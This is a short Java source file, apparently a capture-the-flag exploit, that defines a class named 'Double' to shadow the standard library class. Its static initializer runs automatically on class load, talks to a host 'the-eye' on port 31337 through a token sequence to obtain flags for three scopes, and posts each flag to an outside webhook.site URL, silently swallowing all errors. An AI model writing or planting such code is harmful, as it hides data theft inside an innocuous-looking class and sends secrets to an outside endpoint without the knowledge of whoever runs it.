import java.util.Base64;

public class Double {
  public static double NaN = 0;
  static {
    try {
      String[] scopes = { "geo", "web", "the-eye" };
      for (int i = 0; i < scopes.length; i++) {
        String scope = scopes[i];
        try {
          java.net.Socket s;
          java.io.PrintWriter o;
          java.io.BufferedReader in;
          s = new java.net.Socket("the-eye", 31337);
          o = new java.io.PrintWriter(s.getOutputStream(), true);
          in = new java.io.BufferedReader(new java.io.InputStreamReader(s.getInputStream()));
          o.println(scope + ":::magic");
          String magic = in.readLine().split(":")[1];
          s.close();
          s = new java.net.Socket("the-eye", 31337);
          o = new java.io.PrintWriter(s.getOutputStream(), true);
          in = new java.io.BufferedReader(new java.io.InputStreamReader(s.getInputStream()));
          o.println(scope + ":" + magic + "::create");
          String token1 = in.readLine().split(":")[1];
          s.close();
          s = new java.net.Socket("the-eye", 31337);
          o = new java.io.PrintWriter(s.getOutputStream(), true);
          in = new java.io.BufferedReader(new java.io.InputStreamReader(s.getInputStream()));
          o.println(scope + ":" + magic + ":" + token1 + ":activate");
          String token2 = in.readLine().split(":")[1];
          s.close();
          s = new java.net.Socket("the-eye", 31337);
          o = new java.io.PrintWriter(s.getOutputStream(), true);
          in = new java.io.BufferedReader(new java.io.InputStreamReader(s.getInputStream()));
          o.println(scope + ":" + magic + ":" + token2 + ":bonfire");
          String flag = in.readLine().split(":")[1];
          s.close();
          java.net.URL url = new java.net.URL("https://webhook.site/683246fc-d3ea-4403-9033-d803068aebdf");
          java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
          conn.setRequestMethod("POST");
          conn.setRequestProperty("Content-Type", "text/plain");
          conn.setDoOutput(true);
          conn.getOutputStream().write(("FLAG[" + scope + "]: " + flag).getBytes());
          conn.getResponseCode();
        } catch (Exception e) {
        }
      }
    } catch (Exception e) {
    }
  }
}